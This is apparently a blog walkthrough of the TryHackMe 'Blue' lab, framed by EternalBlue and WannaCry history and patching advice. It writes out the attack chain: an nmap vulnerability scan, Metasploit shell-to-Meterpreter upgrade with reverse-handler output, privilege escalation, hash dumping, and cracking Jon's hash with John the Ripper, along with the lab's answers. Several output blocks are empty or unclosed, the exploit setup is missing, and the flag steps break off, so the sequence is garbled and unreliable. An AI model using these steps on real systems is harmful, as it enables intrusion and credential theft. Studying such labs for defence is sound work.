## Introduction: The EternalBlue Saga

**Picture this:** A top-secret cyberweapon developed by the NSA, designed to infiltrate Windows systems silently, leaks onto the dark web. This is EternalBlue, a name that sends shivers down the spines of cybersecurity professionals. Known as MS17-010, this vulnerability in Microsoft's Server Message Block (SMB) protocol was a game-changer for attackers. When it was leaked by the Shadow Brokers in April 2017, it unleashed chaos, most notably fueling the WannaCry ransomware attack that crippled hospitals, businesses, and governments worldwide.

In this TryHackMe Blue walkthrough, we'll exploit a Windows 7 machine using EternalBlue, showing just how easy it is to compromise an unpatched system. This room isn't a complex CTF but a beginner-friendly educational series to demonstrate real-world vulnerabilities. We'll cover reconnaissance, gaining access, privilege escalation, password cracking, and flag hunting, all while exploring the history and impact of EternalBlue.

*EternalBlue: The NSA exploit that changed cybersecurity forever*

## What is EternalBlue?

EternalBlue, officially MS17-010, is a critical vulnerability in Microsoft's SMBv1 protocol, a network file-sharing system used by Windows to share files and printers. The flaw, identified as CVE-2017-0143 to CVE-2017-0148, allows attackers to send specially crafted packets to a target machine, triggering a buffer overflow that leads to remote code execution (RCE). In plain English: an attacker can run malicious code on a vulnerable Windows machine without authentication, gaining full control.

### How Was EternalBlue Developed?

EternalBlue was crafted by the NSA as part of their arsenal for intelligence-gathering and counterterrorism. The agency discovered a flaw in how Windows handles SMBv1 packets, specifically in the srv!SrvOS2FeaListSizeToNt function, and turned it into a weaponized exploit. For years, it was a closely guarded secret, used in covert operationsâ€”until it wasn't.

### The Dark Web Leak and Ransomware Chaos

In April 2017, a hacker group called the Shadow Brokers leaked EternalBlue and other NSA tools to the dark web, making them accessible to cybercriminals. Just a month later, on May 12, 2017, the WannaCry ransomware exploited EternalBlue to infect over 200,000 systems across 150 countries. Hospitals lost access to patient records, businesses ground to a halt, and governments scrambled to respond. The attack encrypted files and demanded Bitcoin ransoms, highlighting the catastrophic consequences of unpatched systems.

*Global spread of WannaCry ransomware in May 2017*

Microsoft had released a patch (MS17-010) in March 2017, but many organizations failed to apply it, leaving them vulnerable. EternalBlue's ease of use made it a go-to for attackers. Paired with payloads like DoublePulsar, it allowed malware like WannaCry and NotPetya to spread like wildfire across networks. Even today, unpatched systems remain at risk, with over a million machines reportedly vulnerable as late as 2019.

### Why EternalBlue is Cybersecurity's "Hello World"

EternalBlue is a perfect teaching tool because it's both devastating and simple to exploit. It requires minimal technical skill, thanks to tools like Metasploit, which automate the process. The TryHackMe Blue room uses this vulnerability to show beginners how attackers exploit misconfigurations and why patching is critical.

# TryHackMe Blue Walkthrough: Exploiting EternalBlue
Let's dig into my walkthrough of TryHackMe's **Blue** room! This is a beginner-friendly room that focuses on exploiting the infamous EternalBlue vulnerability (MS17-010) that affected Windows systems. This vulnerability was notably used in the WannaCry ransomware attack.

**Room Link:** [TryHackMe Blue Room](https://tryhackme.com/room/blue)

If you want to follow along, head over to the TryHackMe link above and start the machine. This walkthrough will guide you through each step of the exploitation process.
## TASK 1 - Reconnaissance: Scanning the Target

Every hack begins with reconnaissance, and Blue is no exception. Our goal is to identify open ports and vulnerabilities on the target Windows 7 machine. Since the machine doesn't respond to ping (ICMP), we'll use Nmap with specific flags to ensure accurate results.

### Step 1: Start the AttackBox and Machine

First, click the "Start AttackBox" and "Start Machine" buttons on TryHackMe. The AttackBox will open in split-screen view (use the blue "Show Split View" button if needed). The Blue machine may take a few minutes to boot, so be patient.


### Step 2: Initial Nmap Scan

Let's begin with a comprehensive Nmap scan to identify open ports and services. We'll use the following command to perform a detailed scan, including version detection and vulnerability scripts:

```bash
nmap -sV -sC -Pn --script vuln 10.10.10.40
```

**Command breakdown:**
- `-sV`: Detects service versions
- `-sC`: Runs default Nmap scripts
- `-Pn`: Skips ping to avoid false negatives (since the machine doesn't respond to ICMP)
- `--script vuln`: Scans for vulnerabilities using Nmap's scripting engine

**Scan Output:**

```

```

**Analysis of Results:**

The scan reveals several critical findings. Port 445 is open and running Microsoft-DS (SMB), which is our primary target for the EternalBlue exploit. The vulnerability scanner has confirmed that this machine is vulnerable to MS17-010, which is exactly what we need. We can also see that ports 135 and 139 are open, along with RDP on port 3389.


**Answers:**
- How many ports are open with a port number under 1000? **3** (ports 135, 139, 445)
- What is this machine vulnerable to? **ms17-010**

## Task 2 - Gaining Access: Exploiting EternalBlue with Metasploit

Now that we've confirmed the machine is vulnerable to MS17-010, let's use Metasploit to exploit it and gain our initial foothold. Metasploit is a penetration tester's Swiss Army knife, and its EternalBlue module makes this exploit straightforward.

### Step 1: Start Metasploit

Open a terminal on the AttackBox and launch Metasploit:

```bash
msfconsole
```

**Output:**
```

Excellent! We've successfully exploited the EternalBlue vulnerability and obtained a command shell. Press Enter if the shell doesn't appear immediately, and use `Ctrl + Z` to background the shell and return to Metasploit when needed.


## Task 3 - Privilege Escalation: Upgrading to Meterpreter

Our initial shell is basic, so let's upgrade it to a Meterpreter shell for enhanced functionality. Meterpreter is Metasploit's advanced payload that provides powerful post-exploitation capabilities.

### Step 1: Find the Shell-to-Meterpreter Module

Background our current shell and search for the conversion module:

```bash
# Press Ctrl+Z to background the shell
search shell_to_meterpreter
```

**Output:**
```
Matching Modules
================

   #  Name                                    Disclosure Date  Rank    Check  Description

   0  post/multi/manage/shell_to_meterpreter                   normal  No     Shell to Meterpreter Upgrade
```

Select the module:

```bash
use post/multi/manage/shell_to_meterpreter
```

**Answer:** What is the name of the post module? **post/multi/manage/shell_to_meterpreter**

### Step 2: Configure the Module

Check the module options and set the session ID:

```bash
show options
sessions -l
```

**Sessions Output:**
```
Active sessions

```

Set the session ID to convert our shell:

```bash
set SESSION 1
```

**Answer:** What option are we required to change? **SESSION**

### Step 3: Run the Module

Convert our basic shell to a Meterpreter session:

```bash
run
```

**Output:**
```
[*] Upgrading session ID: 1
[*] Starting exploit/multi/handler
[*] Started reverse TCP handler on 10.10.14.15:4433 
[*] Sending stage (200262 bytes) to 10.10.10.40
[*] Meterpreter session 2 opened (10.10.14.15:4433 -> 10.10.10.40:49159) at 2024-01-15 10:37:15 +0000
[*] Stopping exploit/multi/handler
[*] Post module execution completed
```

Now interact with our new Meterpreter session:

```bash
sessions -i 2
```

### Step 4: Escalate to SYSTEM

Verify our current privileges and escalate to SYSTEM:

```bash
getuid
getsystem
getuid
```

**Output:**
```
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM

meterpreter > getsystem
...got system via technique 1 (Named Pipe Impersonation (In Memory/Admin)).

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

Let's confirm our privileges with a DOS shell:

```bash
shell
whoami
```

**Output:**
```
C:\Windows\system32>whoami
whoami
nt authority\system
```

Perfect! We now have the highest privilege level on the system. Background the DOS shell with `Ctrl + Z` to return to Meterpreter.


### Step 5: Migrate to a SYSTEM Process

For stability, let's migrate to a process running as NT AUTHORITY\SYSTEM:

```bash
ps
```

**Output (partial):**
```

## Task 4 - Cracking the Password

With SYSTEM privileges, we can dump password hashes and crack them to reveal user credentials.

### Step 1: Dump Password Hashes

In our Meterpreter session, dump the system password hashes:

```bash
hashdump
```

**Output:**
```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Jon:1000:aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d:::
```

We can see there's a non-default user named "Jon" with a hash that looks crackable.

**Answer:** What is the name of the non-default user? **Jon**

### Step 2: Crack the Hash

Background the Meterpreter session and save Jon's hash to a file:

```bash
background
echo "Jon:1000:aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d:::" > hash.txt
```

Use John the Ripper to crack the NTLM hash:

```bash
john --format=NT --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

**Output:**
```
Using default input encoding: UTF-8
Loaded 1 password hash (NT [MD4 256/256 AVX2 8x3])
Warning: no OpenMP support for this hash type, consider --fork=4
Press 'q' or Ctrl-C to abort, almost any other key for status
alqfna22         (Jon)

Use the "--show --format=NT" option to display all of the cracked passwords reliably
Session completed
```

**Answer:** What is the cracked password? **alqfna22**


## Task 5 - Finding the Flags

Now let's hunt for the three flags hidden on the system, which represent key locations in Windows architecture.

### Flag 1: System Root

Return to our Meterpreter session and navigate to the system root:

```bash
sessions -i 2
cd C:\
dir
cat flag1.txt
```

**Output:**
```
meterpreter > cd C:\
meterpreter > dir
Listing: C:\

**Answer:** **flag{access_the_machine}**

### Flag 2: Password Storage

Navigate to where Windows stores password hashes in the SAM database:

```bash
cd C:\Windows\System32\config
dir
cat flag2.txt
```

**Output:**
```
meterpreter > cd C:\Windows\System32\config

## Why EternalBlue Matters

EternalBlue's simplicity is what makes it terrifying. With just a few Metasploit commands, we gained SYSTEM access to a Windows machine without any credentials. This ease of exploitation, combined with its worm-like spreading capability, made it the weapon of choice for devastating ransomware attacks like WannaCry and NotPetya.

The TryHackMe Blue room demonstrates this perfectly, showing how unpatched systems become low-hanging fruit for attackers. The exploit we just performed took less than 10 minutes from initial scan to complete system compromise, highlighting the critical importance of timely security updates.

### The Real-World Impact

When WannaCry hit in May 2017, it didn't discriminate. Hospitals in the UK had to cancel surgeries and turn away patients. Manufacturing plants stopped production lines. Government agencies went offline. The attack spread automatically across networks, encrypting files and demanding Bitcoin ransoms. All of this was possible because organizations failed to apply Microsoft's patch that had been available for two months.

![WannaCry Ransomware Screen](https://upload.wikimedia.org/wikipedia/en/1/18/Wana_Decrypt0r_screenshot.png)
*The infamous WannaCry ransomware payment screen that terrorized users worldwide*

The economic damage was staggering, with estimates ranging from hundreds of millions to billions of dollars in losses. More importantly, the human cost was immeasurable, particularly in healthcare where lives were literally at stake.

## Key Lessons Learned

**Patch Management is Critical**: Microsoft released the MS17-010 patch in March 2017, well before the WannaCry outbreak. Organizations that applied this patch were protected, while those that delayed became victims. This underscores the importance of having robust patch management processes in place.

**Legacy Protocols Are Dangerous**: SMBv1 is an outdated protocol with known security issues. Modern systems should disable SMBv1 entirely and use SMBv2 or SMBv3, which have better security features and are actively maintained.

**Network Segmentation Helps**: While EternalBlue can spread laterally across networks, proper network segmentation can limit the scope of an attack. Critical systems should be isolated from general user networks.

**Detection and Response Matter**: Advanced endpoint detection and response (EDR) solutions can identify and block exploit attempts like EternalBlue, even on unpatched systems. Network monitoring can also detect the unusual SMB traffic patterns associated with these attacks.

**User Education is Essential**: While EternalBlue doesn't require user interaction, many attacks combine multiple vectors. Educating users about phishing and social engineering can prevent initial compromise that leads to lateral movement using tools like EternalBlue.

## Technical Deep Dive

For those interested in the technical details, EternalBlue exploits a buffer overflow in the SMBv1 protocol's handling of specially crafted packets. The vulnerability exists in the `srv!SrvOS2FeaListSizeToNt` function, where insufficient bounds checking allows an attacker to overflow a buffer and corrupt adjacent memory.

The exploit uses a technique called "pool grooming" to manipulate the Windows kernel pool memory layout, making the overflow reliable and predictable. Once the overflow occurs, the attacker can overwrite critical data structures and gain arbitrary code execution in kernel context, which provides SYSTEM-level privileges.

What makes EternalBlue particularly dangerous is its ability to work without authentication. Unlike many exploits that require valid credentials or user interaction, EternalBlue can compromise a system simply by sending packets to port 445.

## Defensive Strategies

**Immediate Actions:**
- Apply the MS17-010 patch on all Windows systems
- Disable SMBv1 protocol where not absolutely necessary  
- Block port 445 at network boundaries
- Enable Windows Firewall on all systems

**Long-term Security Improvements:**
- Implement comprehensive patch management procedures
- Deploy endpoint detection and response (EDR) solutions
- Establish network segmentation and micro-segmentation
- Regular vulnerability scanning and penetration testing
- Incident response planning and testing

**Monitoring and Detection:**
- Monitor for unusual SMB traffic patterns
- Watch for multiple failed SMB connections
- Alert on suspicious process creation and privilege escalation
- Monitor file system changes consistent with ransomware activity

## Conclusion

The TryHackMe Blue room provides an excellent introduction to exploiting real-world vulnerabilities and demonstrates why EternalBlue remains one of cybersecurity's most important case studies. Through this walkthrough, we've seen how a single unpatched vulnerability can lead to complete system compromise in minutes.

We successfully performed reconnaissance with Nmap, exploited the EternalBlue vulnerability using Metasploit, escalated to SYSTEM privileges, cracked user passwords, and located hidden flags throughout the system. Each step highlighted different aspects of the attack lifecycle and post-exploitation activities.

The simplicity of this attack is both educational and sobering. It requires no advanced hacking skills or sophisticated tools, just basic knowledge of Metasploit and an unpatched target. This accessibility is precisely what made EternalBlue so devastating in real-world attacks.

EternalBlue serves as cybersecurity's "Hello World" because it perfectly illustrates fundamental security principles: the importance of timely patching, the dangers of legacy protocols, and the catastrophic potential of weaponized vulnerabilities. Every security professional should understand this exploit, not to cause harm, but to better defend against such attacks.

For those looking to continue their learning journey, TryHackMe offers follow-up rooms like "Ice" and "Blaster" that build upon these concepts with additional Windows exploitation techniques. The key is to always practice these skills in controlled, legal environments and use the knowledge to build better defenses.

Remember, the goal of understanding attack techniques is to become a better defender. As we've seen with EternalBlue, the cost of poor security practices can be measured not just in dollars, but in human lives and societal impact. Use this knowledge responsibly, keep learning, and help make the digital world more secure for everyone.
